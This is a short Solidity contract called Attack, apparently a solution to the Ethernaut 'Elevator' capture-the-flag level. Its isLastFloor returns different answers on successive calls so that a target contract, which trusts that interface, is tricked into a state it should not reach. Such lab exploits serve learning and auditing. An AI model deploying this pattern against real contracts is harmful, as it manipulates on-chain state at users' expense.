// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IElevator {
    function goTo(uint) external;
}

contract Attack {
    bool isSecondTime = false;

    function isLastFloor(uint) external returns (bool) {
        if (isSecondTime) {
            return true;
        }

        isSecondTime = true;
        return false;
    }

    function attack(address _target /*instance address*/) external {
        IElevator elevator = IElevator(_target);

        elevator.goTo(1);
    }
}
